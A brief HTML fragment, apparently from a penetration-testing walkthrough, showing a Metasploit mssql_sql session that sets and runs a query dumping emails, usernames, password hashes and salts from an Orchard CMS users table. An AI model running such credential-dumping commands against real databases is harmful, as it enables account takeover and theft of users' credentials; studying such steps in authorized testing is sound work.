...
<p>msf auxiliary(<font color="red">mssql_sql</font>) > set SQL USE orcharddb; SELECT <br>Id,Email,NormalizedUserName,Password,PasswordFormat,HashAlgorithm,PasswordSalt FROM blog_Orchard_Users_UserPartRecord
<br>SQL => USE orcharddb; SELECT Id,Email,NormalizedUserName,Password,PasswordFormat,HashAlgorithm,PasswordSalt FROM <br>blog_Orchard_Users_UserPartRecord
<br>msf auxiliary(<font color="red">mssql_sql</font>) > exploit</p> 
